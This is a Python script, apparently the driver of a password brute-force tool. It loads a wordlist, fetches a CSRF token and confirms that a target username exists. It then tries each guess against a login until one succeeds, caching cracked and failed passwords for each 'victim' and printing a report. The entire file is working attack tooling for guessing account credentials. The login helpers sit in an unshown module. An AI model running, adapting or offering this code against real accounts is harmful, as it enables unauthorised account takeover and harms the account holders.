# Importing modules
import config
import time
import module
import random
from module import PrintEVEN


# Declaring Variables
start = time.time()
attempt = [0]
victim = config.target
report = {}
guess_passwords = []
with open(config.paths['guessPasswords'], "r") as file:
    lis = file.read().split('\n')
    file.close()
    for password in lis:
        if (password != "") or (password != " "):
            guess_passwords.append(password)
csrf = module.get_csrf(random)

print(
    f'\tButeForce started at {time.strftime("%H:%M:%S", time.localtime())} on - {victim}')

print(f'{"-"*70}\n')


def generateReport(PasswordFound, CORRECT_PASSWORD):
    report["Time taken"] = f"{int(time.time() - start)} sec"
    report['Attempts'] = str(attempt[0])
    if PasswordFound:
        report["Password found"] = "True"
        report['Password'] = CORRECT_PASSWORD


def initialize():
    if module.uerExists(victim):
        if module.cacheFOUND(victim, config.paths['success']):
            with open(f"{config.paths['success']}{victim}.txt", "r") as file:
                pw = file.read().replace("\n", "")
                PrintEVEN([f"Password is '{pw}'", ' ', "|From Cache|"], 27)
                generateReport(True, f'{pw}')
        else:
            try:
                UsedPasswords = open(
                    f"{config.paths['fail']}{victim}.txt", "r").read().split("\n")
                print(f"Used password for '{victim}' are found\n")
            except:
                UsedPasswords = None
            finally:
                print("Running main.........")
                try:
                    main(victim, guess_passwords, csrf, UsedPasswords)
                except:
                    print(f"\t\t\tNO INTERNET CONNECTED")

    else:
        print(f"The username '{victim}' dose not exists")


def main(victim, guess_passwords, csrf, UsedPasswords):
    for i in range(0, len(guess_passwords)):
        passwordToTry = guess_passwords[i]
        if (UsedPasswords != None) and (passwordToTry in UsedPasswords):
            PrintEVEN([passwordToTry, "-", "is not used again"], 15)

        else:
            if passwordToTry in ["", " ", "\n"]:
                pass
            else:
                loginRES = module.login(victim, passwordToTry, csrf)
                print(f"trying '{passwordToTry}'")
                if module.analyse(loginRES, victim, passwordToTry) == True:
                    CORRECT_PASSWORD = passwordToTry
                    print(f"Password is {CORRECT_PASSWORD}")
                    generateReport(True, CORRECT_PASSWORD)
                    break
                PrintEVEN([passwordToTry, "", "is incorrect"], 10)
        attempt[0] = attempt[0]+1

    generateReport(False, None)


# Calling Functions
module.initialForCache()
initialize()
print(f'\n{"-"*70}')
for name in report:
    PrintEVEN([name, "=>", report[name]], 20)
